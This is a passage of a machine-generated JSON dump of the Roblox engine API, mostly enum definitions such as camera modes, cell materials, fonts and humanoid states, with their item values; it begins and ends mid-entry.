key","Default":null}],"Name":"TypeKey","tags":["LocalUserSecurity"],"Class":"VirtualUser","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Visit","tags":["notCreatable"]},{"ReturnType":"string","Arguments":[],"Name":"GetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"pingUrl","Default":null},{"Type":"int","Name":"interval","Default":null}],"Name":"SetPing","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetUploadUrl","tags":["RobloxSecurity"],"Class":"Visit","type":"Function"},{"type":"Enum","Name":"AASamples","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":1,"Enum":"AASamples"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"AASamples"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"AASamples"},{"type":"Enum","Name":"AccessType","tags":[]},{"type":"EnumItem","Name":"Me","tags":[],"Value":0,"Enum":"AccessType"},{"type":"EnumItem","Name":"Friends","tags":[],"Value":1,"Enum":"AccessType"},{"type":"EnumItem","Name":"Everyone","tags":[],"Value":2,"Enum":"AccessType"},{"type":"EnumItem","Name":"InviteOnly","tags":[],"Value":3,"Enum":"AccessType"},{"type":"Enum","Name":"ActionType","tags":[]},{"type":"EnumItem","Name":"Nothing","tags":[],"Value":0,"Enum":"ActionType"},{"type":"EnumItem","Name":"Pause","tags":[],"Value":1,"Enum":"ActionType"},{"type":"EnumItem","Name":"Lose","tags":[],"Value":2,"Enum":"ActionType"},{"type":"EnumItem","Name":"Draw","tags":[],"Value":3,"Enum":"ActionType"},{"type":"EnumItem","Name":"Win","tags":[],"Value":4,"Enum":"ActionType"},{"type":"Enum","Name":"ActuatorType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Motor","tags":[],"Value":1,"Enum":"ActuatorType"},{"type":"EnumItem","Name":"Servo","tags":[],"Value":2,"Enum":"ActuatorType"},{"type":"Enum","Name":"AnimationPriority","tags":[]},{"type":"EnumItem","Name":"Idle","tags":[],"Value":0,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Action","tags":[],"Value":2,"Enum":"AnimationPriority"},{"type":"EnumItem","Name":"Core","tags":[],"Value":1000,"Enum":"AnimationPriority"},{"type":"Enum","Name":"Antialiasing","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"Antialiasing"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"Antialiasing"},{"type":"Enum","Name":"Axis","tags":[]},{"type":"EnumItem","Name":"X","tags":[],"Value":0,"Enum":"Axis"},{"type":"EnumItem","Name":"Y","tags":[],"Value":1,"Enum":"Axis"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"Axis"},{"type":"Enum","Name":"BinType","tags":[]},{"type":"EnumItem","Name":"Script","tags":[],"Value":0,"Enum":"BinType"},{"type":"EnumItem","Name":"GameTool","tags":[],"Value":1,"Enum":"BinType"},{"type":"EnumItem","Name":"Grab","tags":[],"Value":2,"Enum":"BinType"},{"type":"EnumItem","Name":"Clone","tags":[],"Value":3,"Enum":"BinType"},{"type":"EnumItem","Name":"Hammer","tags":[],"Value":4,"Enum":"BinType"},{"type":"Enum","Name":"BodyPart","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"BodyPart"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftArm","tags":[],"Value":2,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightArm","tags":[],"Value":3,"Enum":"BodyPart"},{"type":"EnumItem","Name":"LeftLeg","tags":[],"Value":4,"Enum":"BodyPart"},{"type":"EnumItem","Name":"RightLeg","tags":[],"Value":5,"Enum":"BodyPart"},{"type":"Enum","Name":"Button","tags":[]},{"type":"EnumItem","Name":"Jump","tags":[],"Value":32,"Enum":"Button"},{"type":"EnumItem","Name":"Dismount","tags":[],"Value":8,"Enum":"Button"},{"type":"Enum","Name":"ButtonStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButtonDefault","tags":[],"Value":1,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxButton","tags":[],"Value":2,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundButton","tags":[],"Value":3,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDefaultButton","tags":[],"Value":4,"Enum":"ButtonStyle"},{"type":"EnumItem","Name":"RobloxRoundDropdownButton","tags":[],"Value":5,"Enum":"ButtonStyle"},{"type":"Enum","Name":"CameraMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraMode"},{"type":"EnumItem","Name":"LockFirstPerson","tags":[],"Value":1,"Enum":"CameraMode"},{"type":"Enum","Name":"CameraPanMode","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"CameraPanMode"},{"type":"EnumItem","Name":"EdgeBump","tags":[],"Value":1,"Enum":"CameraPanMode"},{"type":"Enum","Name":"CameraType","tags":[]},{"type":"EnumItem","Name":"Fixed","tags":[],"Value":0,"Enum":"CameraType"},{"type":"EnumItem","Name":"Watch","tags":[],"Value":2,"Enum":"CameraType"},{"type":"EnumItem","Name":"Attach","tags":[],"Value":1,"Enum":"CameraType"},{"type":"EnumItem","Name":"Track","tags":[],"Value":3,"Enum":"CameraType"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":4,"Enum":"CameraType"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":5,"Enum":"CameraType"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":6,"Enum":"CameraType"},{"type":"Enum","Name":"CellBlock","tags":[]},{"type":"EnumItem","Name":"Solid","tags":[],"Value":0,"Enum":"CellBlock"},{"type":"EnumItem","Name":"VerticalWedge","tags":[],"Value":1,"Enum":"CellBlock"},{"type":"EnumItem","Name":"CornerWedge","tags":[],"Value":2,"Enum":"CellBlock"},{"type":"EnumItem","Name":"InverseCornerWedge","tags":[],"Value":3,"Enum":"CellBlock"},{"type":"EnumItem","Name":"HorizontalWedge","tags":[],"Value":4,"Enum":"CellBlock"},{"type":"Enum","Name":"CellMaterial","tags":[]},{"type":"EnumItem","Name":"Empty","tags":[],"Value":0,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":2,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":3,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":4,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Asphalt","tags":[],"Value":5,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Iron","tags":[],"Value":6,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Aluminum","tags":[],"Value":7,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gold","tags":[],"Value":8,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodPlank","tags":[],"Value":9,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"WoodLog","tags":[],"Value":10,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Gravel","tags":[],"Value":11,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"CinderBlock","tags":[],"Value":12,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"MossyStone","tags":[],"Value":13,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Cement","tags":[],"Value":14,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"RedPlastic","tags":[],"Value":15,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"BluePlastic","tags":[],"Value":16,"Enum":"CellMaterial"},{"type":"EnumItem","Name":"Water","tags":[],"Value":17,"Enum":"CellMaterial"},{"type":"Enum","Name":"CellOrientation","tags":[]},{"type":"EnumItem","Name":"NegZ","tags":[],"Value":0,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"X","tags":[],"Value":1,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"Z","tags":[],"Value":2,"Enum":"CellOrientation"},{"type":"EnumItem","Name":"NegX","tags":[],"Value":3,"Enum":"CellOrientation"},{"type":"Enum","Name":"CenterDialogType","tags":[]},{"type":"EnumItem","Name":"UnsolicitedDialog","tags":[],"Value":1,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"PlayerInitiatedDialog","tags":[],"Value":2,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"ModalDialog","tags":[],"Value":3,"Enum":"CenterDialogType"},{"type":"EnumItem","Name":"QuitDialog","tags":[],"Value":4,"Enum":"CenterDialogType"},{"type":"Enum","Name":"ChatColor","tags":[]},{"type":"EnumItem","Name":"Blue","tags":[],"Value":0,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Green","tags":[],"Value":1,"Enum":"ChatColor"},{"type":"EnumItem","Name":"Red","tags":[],"Value":2,"Enum":"ChatColor"},{"type":"Enum","Name":"ChatMode","tags":[]},{"type":"EnumItem","Name":"Menu","tags":[],"Value":0,"Enum":"ChatMode"},{"type":"EnumItem","Name":"TextAndMenu","tags":[],"Value":1,"Enum":"ChatMode"},{"type":"Enum","Name":"ChatStyle","tags":[]},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"Bubble","tags":[],"Value":1,"Enum":"ChatStyle"},{"type":"EnumItem","Name":"ClassicAndBubble","tags":[],"Value":2,"Enum":"ChatStyle"},{"type":"Enum","Name":"CollisionFidelity","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Hull","tags":[],"Value":1,"Enum":"CollisionFidelity"},{"type":"EnumItem","Name":"Box","tags":[],"Value":2,"Enum":"CollisionFidelity"},{"type":"Enum","Name":"ComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"ComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"ComputerCameraMovementMode"},{"type":"Enum","Name":"ComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"ComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"ComputerMovementMode"},{"type":"Enum","Name":"ConcurrencyModel","tags":[]},{"type":"EnumItem","Name":"Serial","tags":[],"Value":0,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Safe","tags":[],"Value":1,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Logical","tags":[],"Value":2,"Enum":"ConcurrencyModel"},{"type":"EnumItem","Name":"Empirical","tags":[],"Value":3,"Enum":"ConcurrencyModel"},{"type":"Enum","Name":"ControlMode","tags":[]},{"type":"EnumItem","Name":"MouseLockSwitch","tags":[],"Value":1,"Enum":"ControlMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":0,"Enum":"ControlMode"},{"type":"Enum","Name":"CoreGuiType","tags":[]},{"type":"EnumItem","Name":"PlayerList","tags":[],"Value":0,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Health","tags":[],"Value":1,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Backpack","tags":[],"Value":2,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"Chat","tags":[],"Value":3,"Enum":"CoreGuiType"},{"type":"EnumItem","Name":"All","tags":[],"Value":4,"Enum":"CoreGuiType"},{"type":"Enum","Name":"CreatorType","tags":[]},{"type":"EnumItem","Name":"User","tags":[],"Value":0,"Enum":"CreatorType"},{"type":"EnumItem","Name":"Group","tags":[],"Value":1,"Enum":"CreatorType"},{"type":"Enum","Name":"CurrencyType","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Robux","tags":[],"Value":1,"Enum":"CurrencyType"},{"type":"EnumItem","Name":"Tix","tags":[],"Value":2,"Enum":"CurrencyType"},{"type":"Enum","Name":"CustomCameraMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"CustomCameraMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"CustomCameraMode"},{"type":"Enum","Name":"DevCameraOcclusionMode","tags":[]},{"type":"EnumItem","Name":"Zoom","tags":[],"Value":0,"Enum":"DevCameraOcclusionMode"},{"type":"EnumItem","Name":"Invisicam","tags":[],"Value":1,"Enum":"DevCameraOcclusionMode"},{"type":"Enum","Name":"DevComputerCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevComputerCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevComputerCameraMovementMode"},{"type":"Enum","Name":"DevComputerMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"KeyboardMouse","tags":[],"Value":1,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":2,"Enum":"DevComputerMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":3,"Enum":"DevComputerMovementMode"},{"type":"Enum","Name":"DevTouchCameraMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Classic","tags":[],"Value":1,"Enum":"DevTouchCameraMovementMode"},{"type":"EnumItem","Name":"Follow","tags":[],"Value":2,"Enum":"DevTouchCameraMovementMode"},{"type":"Enum","Name":"DevTouchMovementMode","tags":[]},{"type":"EnumItem","Name":"UserChoice","tags":[],"Value":0,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbstick","tags":[],"Value":1,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"DPad","tags":[],"Value":2,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Thumbpad","tags":[],"Value":3,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"ClickToMove","tags":[],"Value":4,"Enum":"DevTouchMovementMode"},{"type":"EnumItem","Name":"Scriptable","tags":[],"Value":5,"Enum":"DevTouchMovementMode"},{"type":"Enum","Name":"DialogPurpose","tags":[]},{"type":"EnumItem","Name":"Quest","tags":[],"Value":0,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Help","tags":[],"Value":1,"Enum":"DialogPurpose"},{"type":"EnumItem","Name":"Shop","tags":[],"Value":2,"Enum":"DialogPurpose"},{"type":"Enum","Name":"DialogTone","tags":[]},{"type":"EnumItem","Name":"Neutral","tags":[],"Value":0,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Friendly","tags":[],"Value":1,"Enum":"DialogTone"},{"type":"EnumItem","Name":"Enemy","tags":[],"Value":2,"Enum":"DialogTone"},{"type":"Enum","Name":"EasingDirection","tags":[]},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"EasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"EasingDirection"},{"type":"Enum","Name":"EasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Sine","tags":[],"Value":1,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quad","tags":[],"Value":3,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quart","tags":[],"Value":4,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Quint","tags":[],"Value":5,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":6,"Enum":"EasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":7,"Enum":"EasingStyle"},{"type":"Enum","Name":"EnviromentalPhysicsThrottle","tags":[]},{"type":"EnumItem","Name":"DefaultAuto","tags":[],"Value":0,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Disabled","tags":[],"Value":1,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Always","tags":[],"Value":2,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip2","tags":[],"Value":3,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip4","tags":[],"Value":4,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip8","tags":[],"Value":5,"Enum":"EnviromentalPhysicsThrottle"},{"type":"EnumItem","Name":"Skip16","tags":[],"Value":6,"Enum":"EnviromentalPhysicsThrottle"},{"type":"Enum","Name":"ErrorReporting","tags":[]},{"type":"EnumItem","Name":"DontReport","tags":[],"Value":0,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Prompt","tags":[],"Value":1,"Enum":"ErrorReporting"},{"type":"EnumItem","Name":"Report","tags":[],"Value":2,"Enum":"ErrorReporting"},{"type":"Enum","Name":"ExplosionType","tags":[]},{"type":"EnumItem","Name":"NoCraters","tags":[],"Value":0,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"Craters","tags":[],"Value":1,"Enum":"ExplosionType"},{"type":"EnumItem","Name":"CratersAndDebris","tags":[],"Value":2,"Enum":"ExplosionType"},{"type":"Enum","Name":"FilterResult","tags":[]},{"type":"EnumItem","Name":"Rejected","tags":[],"Value":1,"Enum":"FilterResult"},{"type":"EnumItem","Name":"Accepted","tags":[],"Value":0,"Enum":"FilterResult"},{"type":"Enum","Name":"Font","tags":[]},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"Font"},{"type":"EnumItem","Name":"Arial","tags":[],"Value":1,"Enum":"Font"},{"type":"EnumItem","Name":"ArialBold","tags":[],"Value":2,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSans","tags":[],"Value":3,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansBold","tags":[],"Value":4,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansLight","tags":[],"Value":5,"Enum":"Font"},{"type":"EnumItem","Name":"SourceSansItalic","tags":[],"Value":6,"Enum":"Font"},{"type":"Enum","Name":"FontSize","tags":[]},{"type":"EnumItem","Name":"Size8","tags":[],"Value":0,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size9","tags":[],"Value":1,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size10","tags":[],"Value":2,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size11","tags":[],"Value":3,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size12","tags":[],"Value":4,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size14","tags":[],"Value":5,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size18","tags":[],"Value":6,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size24","tags":[],"Value":7,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size36","tags":[],"Value":8,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size48","tags":[],"Value":9,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size28","tags":[],"Value":10,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size32","tags":[],"Value":11,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size42","tags":[],"Value":12,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size60","tags":[],"Value":13,"Enum":"FontSize"},{"type":"EnumItem","Name":"Size96","tags":[],"Value":14,"Enum":"FontSize"},{"type":"Enum","Name":"FormFactor","tags":[]},{"type":"EnumItem","Name":"Symmetric","tags":[],"Value":0,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":1,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Plate","tags":[],"Value":2,"Enum":"FormFactor"},{"type":"EnumItem","Name":"Custom","tags":[],"Value":3,"Enum":"FormFactor"},{"type":"Enum","Name":"FrameStyle","tags":[]},{"type":"EnumItem","Name":"Custom","tags":[],"Value":0,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatBlue","tags":[],"Value":1,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxSquare","tags":[],"Value":2,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"RobloxRound","tags":[],"Value":3,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatGreen","tags":[],"Value":4,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"ChatRed","tags":[],"Value":5,"Enum":"FrameStyle"},{"type":"EnumItem","Name":"DropShadow","tags":[],"Value":6,"Enum":"FrameStyle"},{"type":"Enum","Name":"FramerateManagerMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"On","tags":[],"Value":1,"Enum":"FramerateManagerMode"},{"type":"EnumItem","Name":"Off","tags":[],"Value":2,"Enum":"FramerateManagerMode"},{"type":"Enum","Name":"FriendRequestEvent","tags":[]},{"type":"EnumItem","Name":"Issue","tags":[],"Value":0,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Revoke","tags":[],"Value":1,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Accept","tags":[],"Value":2,"Enum":"FriendRequestEvent"},{"type":"EnumItem","Name":"Deny","tags":[],"Value":3,"Enum":"FriendRequestEvent"},{"type":"Enum","Name":"FriendStatus","tags":[]},{"type":"EnumItem","Name":"Unknown","tags":[],"Value":0,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"NotFriend","tags":[],"Value":1,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"Friend","tags":[],"Value":2,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestSent","tags":[],"Value":3,"Enum":"FriendStatus"},{"type":"EnumItem","Name":"FriendRequestReceived","tags":[],"Value":4,"Enum":"FriendStatus"},{"type":"Enum","Name":"FunctionalTestResult","tags":[]},{"type":"EnumItem","Name":"Passed","tags":[],"Value":0,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Warning","tags":[],"Value":1,"Enum":"FunctionalTestResult"},{"type":"EnumItem","Name":"Error","tags":[],"Value":2,"Enum":"FunctionalTestResult"},{"type":"Enum","Name":"GearGenreSetting","tags":[]},{"type":"EnumItem","Name":"AllGenres","tags":[],"Value":0,"Enum":"GearGenreSetting"},{"type":"EnumItem","Name":"MatchingGenreOnly","tags":[],"Value":1,"Enum":"GearGenreSetting"},{"type":"Enum","Name":"GearType","tags":[]},{"type":"EnumItem","Name":"MeleeWeapons","tags":[],"Value":0,"Enum":"GearType"},{"type":"EnumItem","Name":"RangedWeapons","tags":[],"Value":1,"Enum":"GearType"},{"type":"EnumItem","Name":"Explosives","tags":[],"Value":2,"Enum":"GearType"},{"type":"EnumItem","Name":"PowerUps","tags":[],"Value":3,"Enum":"GearType"},{"type":"EnumItem","Name":"NavigationEnhancers","tags":[],"Value":4,"Enum":"GearType"},{"type":"EnumItem","Name":"MusicalInstruments","tags":[],"Value":5,"Enum":"GearType"},{"type":"EnumItem","Name":"SocialItems","tags":[],"Value":6,"Enum":"GearType"},{"type":"EnumItem","Name":"BuildingTools","tags":[],"Value":7,"Enum":"GearType"},{"type":"EnumItem","Name":"Transport","tags":[],"Value":8,"Enum":"GearType"},{"type":"Enum","Name":"Genre","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"Genre"},{"type":"EnumItem","Name":"TownAndCity","tags":[],"Value":1,"Enum":"Genre"},{"type":"EnumItem","Name":"Fantasy","tags":[],"Value":2,"Enum":"Genre"},{"type":"EnumItem","Name":"SciFi","tags":[],"Value":3,"Enum":"Genre"},{"type":"EnumItem","Name":"Ninja","tags":[],"Value":4,"Enum":"Genre"},{"type":"EnumItem","Name":"Scary","tags":[],"Value":5,"Enum":"Genre"},{"type":"EnumItem","Name":"Pirate","tags":[],"Value":6,"Enum":"Genre"},{"type":"EnumItem","Name":"Adventure","tags":[],"Value":7,"Enum":"Genre"},{"type":"EnumItem","Name":"Sports","tags":[],"Value":8,"Enum":"Genre"},{"type":"EnumItem","Name":"Funny","tags":[],"Value":9,"Enum":"Genre"},{"type":"EnumItem","Name":"WildWest","tags":[],"Value":10,"Enum":"Genre"},{"type":"EnumItem","Name":"War","tags":[],"Value":11,"Enum":"Genre"},{"type":"EnumItem","Name":"SkatePark","tags":[],"Value":12,"Enum":"Genre"},{"type":"EnumItem","Name":"Tutorial","tags":[],"Value":13,"Enum":"Genre"},{"type":"Enum","Name":"GraphicsMode","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":1,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D9","tags":[],"Value":3,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"Direct3D11","tags":[],"Value":2,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"OpenGL","tags":[],"Value":4,"Enum":"GraphicsMode"},{"type":"EnumItem","Name":"NoGraphics","tags":[],"Value":5,"Enum":"GraphicsMode"},{"type":"Enum","Name":"HandlesStyle","tags":[]},{"type":"EnumItem","Name":"Resize","tags":[],"Value":0,"Enum":"HandlesStyle"},{"type":"EnumItem","Name":"Movement","tags":[],"Value":1,"Enum":"HandlesStyle"},{"type":"Enum","Name":"HttpContentType","tags":[]},{"type":"EnumItem","Name":"ApplicationJson","tags":[],"Value":0,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationXml","tags":[],"Value":1,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"ApplicationUrlEncoded","tags":[],"Value":2,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextPlain","tags":[],"Value":3,"Enum":"HttpContentType"},{"type":"EnumItem","Name":"TextXml","tags":[],"Value":4,"Enum":"HttpContentType"},{"type":"Enum","Name":"HumanoidDisplayDistanceType","tags":[]},{"type":"EnumItem","Name":"Viewer","tags":[],"Value":0,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"Subject","tags":[],"Value":1,"Enum":"HumanoidDisplayDistanceType"},{"type":"EnumItem","Name":"None","tags":[],"Value":2,"Enum":"HumanoidDisplayDistanceType"},{"type":"Enum","Name":"HumanoidRigType","tags":[]},{"type":"EnumItem","Name":"R6","tags":[],"Value":0,"Enum":"HumanoidRigType"},{"type":"EnumItem","Name":"R15","tags":[],"Value":1,"Enum":"HumanoidRigType"},{"type":"Enum","Name":"HumanoidStateType","tags":[]},{"type":"EnumItem","Name":"FallingDown","tags":[],"Value":0,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Running","tags":[],"Value":8,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"RunningNoPhysics","tags":[],"Value":10,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Climbing","tags":[],"Value":12,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"StrafingNoPhysics","tags":[],"Value":11,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Ragdoll","tags":[],"Value":1,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"GettingUp","tags":[],"Value":2,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Jumping","tags":[],"Value":3,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Landed","tags":[],"Value":7,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Flying","tags":[],"Value":6,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Freefall","tags":[],"Value":5,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Seated","tags":[],"Value":13,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"PlatformStanding","tags":[],"Value":14,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Dead","tags":[],"Value":15,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Swimming","tags":[],"Value":4,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"Physics","tags":[],"Value":16,"Enum":"HumanoidStateType"},{"type":"EnumItem","Name":"None","tags":[],"Value":18,"Enum":"HumanoidStateType"},{"type":"Enum","Name":"InOut","tags":[]},{"type":"EnumItem","Name":"Edge","tags":[],"Value":0,"Enum":"InOut"},{"type":"EnumItem","Name":"Inset","tags":[],"Value":1,"Enum":"InOut"},{"type":"EnumItem","Name":"Center","tags":[],"Value":2,"Enum":"InOut"},{"type":"Enum","Name":"InfoType","tags":[]},{"type":"EnumItem","Name":"Asset","tags":[],"Value":0,"Enum":"InfoType"},{"type":"EnumItem","Name":"Product","tags":[],"Value":1,"Enum":"InfoType"},{"type":"Enum","Name":"InputType","tags":[]},{"type":"EnumItem","Name":"NoInput","tags":[],"Value":0,"Enum":"InputType"},{"type":"EnumItem","Name":"LeftTread","tags":[],"Value":1,"Enum":"InputT